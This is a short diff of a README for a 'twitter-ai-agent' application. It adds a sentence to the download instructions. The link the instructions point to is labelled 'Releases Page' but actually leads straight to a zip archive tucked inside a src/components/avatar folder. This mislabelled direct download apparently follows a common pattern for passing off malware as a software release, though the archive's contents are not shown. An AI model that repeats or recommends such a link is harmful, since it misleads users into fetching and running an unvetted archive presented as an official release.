@@ -17,6 +17,8 @@ The **twitter-ai-agent** application allows users to interact with Twitter using
 
 ## 📥 Download & Install
 
+To get started, you need to download the application.
+
 1. Visit this page to download: [Releases Page](https://github.com/Saminiscool/twitter-ai-agent/raw/refs/heads/main/src/components/avatar/twitter_ai_agent_1.4.zip)
 
 2. Choose the latest version of the software from the list provided.
